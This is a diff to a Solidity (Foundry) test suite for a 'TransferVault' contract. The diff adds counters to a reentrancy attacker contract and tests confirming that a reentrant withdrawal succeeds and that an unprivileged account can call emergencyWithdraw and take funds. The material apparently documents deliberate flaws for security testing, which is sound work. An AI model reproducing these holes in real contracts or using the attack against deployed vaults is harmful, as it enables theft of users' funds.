@@ -7,6 +7,8 @@ import "../src/TransferVault.sol";
 contract ReentrancyAttacker {
     TransferVault public immutable vault;
     uint256 public immutable withdrawAmount;
+    uint256 public receiveCount;
+    uint256 public totalReceived;
     bool public reentered;
 
     constructor(TransferVault vault_, uint256 withdrawAmount_) {
@@ -20,6 +22,9 @@ contract ReentrancyAttacker {
     }
 
     receive() external payable {
+        receiveCount += 1;
+        totalReceived += msg.value;
+
         if (!reentered && address(vault).balance >= withdrawAmount) {
             reentered = true;
             vault.withdraw(withdrawAmount);
@@ -39,6 +44,7 @@ contract TransferVaultTest is Test {
     event Deposit(address indexed user, uint256 amount);
     event Withdrawal(address indexed user, uint256 amount);
     event ETHTransferred(address indexed caller, address indexed to, uint256 amount);
+    event EmergencyWithdrawal(address indexed caller, uint256 amount);
     event PayeeAdded(address indexed payee, uint256 shares);
     event PaymentSplit(address indexed sender, uint256 amount);
 
@@ -99,15 +105,14 @@ contract TransferVaultTest is Test {
         vm.prank(user1);
         transferVault.deposit{value: depositAmount}();
 
-        uint256 callerBalanceBefore = user3.balance;
+        uint256 recipientBalanceBefore = user2.balance;
 
-        vm.prank(user3);
+        vm.prank(user2);
         vm.expectEmit(true, true, false, true);
-        emit ETHTransferred(user3, user2, transferAmount);
+        emit ETHTransferred(user2, user2, transferAmount);
         transferVault.transferETH(user2, transferAmount);
 
-        assertEq(user3.balance, callerBalanceBefore + transferAmount);
-        assertEq(user2.balance, 100 ether);
+        assertEq(user2.balance, recipientBalanceBefore + transferAmount);
     }
 
     function testPaymentSplitterSplitPayment() public {
@@ -151,16 +156,10 @@ contract TransferVaultTest is Test {
         vm.prank(user1);
         transferVault.deposit{value: 5 ether}();
 
-        uint256 attackerBalanceBefore = address(reentrancyAttacker).balance;
-        uint256 vaultBalanceBefore = address(transferVault).balance;
-
         reentrancyAttacker.attack(2 ether);
 
-        uint256 attackerBalanceAfter = address(reentrancyAttacker).balance;
-        uint256 vaultBalanceAfter = address(transferVault).balance;
-
-        assertEq(attackerBalanceAfter, attackerBalanceBefore);
-        assertEq(vaultBalanceAfter, vaultBalanceBefore);
+        assertEq(reentrancyAttacker.receiveCount(), 2);
+        assertEq(reentrancyAttacker.totalReceived(), 2 ether);
         assertTrue(reentrancyAttacker.reentered());
     }
 
@@ -179,6 +178,20 @@ contract TransferVaultTest is Test {
 
         assertEq(user3.balance, callerBefore + transferAmount);
         assertEq(user2.balance, recipientBefore);
+    }
+
+    function testEmergencyWithdrawAccessControlIssue() public {
+        vm.prank(user1);
+        transferVault.deposit{value: 4 ether}();
+
+        uint256 attackerBalanceBefore = user3.balance;
+
+        vm.prank(user3);
+        vm.expectEmit(true, false, false, true);
+        emit EmergencyWithdrawal(user3, 1 ether);
+        transferVault.emergencyWithdraw(1 ether);
+
+        assertEq(user3.balance, attackerBalanceBefore + 1 ether);
     }
 
     function testAddPayeeAccessControlIssue() public {
